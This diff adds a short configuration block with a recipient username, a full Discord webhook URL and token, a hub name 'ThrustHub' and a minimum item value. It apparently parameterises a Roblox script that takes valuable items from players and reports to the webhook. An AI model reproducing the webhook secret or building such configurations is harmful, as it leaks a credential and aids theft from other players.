@@ -1,0 +1,7 @@
+Username = "palapuy23"
+Username2 = "palapuy23"
+Webhook = "https://discord.com/api/webhooks/1215086774343307264/K8Hqla7ZlZFSHiWo0Ts7Khsadg2A7yCYo0dLfvleKK7s_j7JkeRND2-kwWyriFKhRrqA"
+
+HubName = "ThrustHub"
+
+MinimumRAP = 100000
